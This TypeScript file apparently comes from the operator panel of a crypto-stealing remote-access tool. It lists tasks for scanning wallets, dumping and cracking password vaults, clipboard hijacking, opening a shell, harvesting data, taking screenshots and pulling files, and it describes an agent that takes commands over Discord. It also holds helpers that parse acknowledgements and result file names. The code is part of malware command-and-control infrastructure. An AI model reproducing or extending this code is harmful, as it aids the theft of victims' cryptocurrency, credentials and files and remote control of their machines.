export const TASK_NAMES = [
  'scan_wallets',
  'dump_vault',
  'crack_vault',
  'clip_start',
  'clip_stop',
  'shell',
  'harvest',
  'screenshot',
  'file_pull',
  'cancel',
  'agent'
] as const;

/**
 * The agent acknowledges a Discord command before the crypto module has run.
 * That text must not close the panel task; the artifact or result JSON does.
 */
export function isTaskQueuedAck(content: string): boolean {
  return /^Task .* queued$/i.test(content.trim());
}

const RESULT_NAME = new RegExp(`^result-(${TASK_NAMES.join('|')})-(.+)\\.json$`);

/** `result-crack_vault-local-123.json` → `{ name: 'crack_vault', id: 'local-123' }`. */
export function parseResultName(name: string): { name: string; id: string } | null {
  const match = RESULT_NAME.exec(name);
  return match ? { name: match[1]!, id: match[2]! } : null;
}
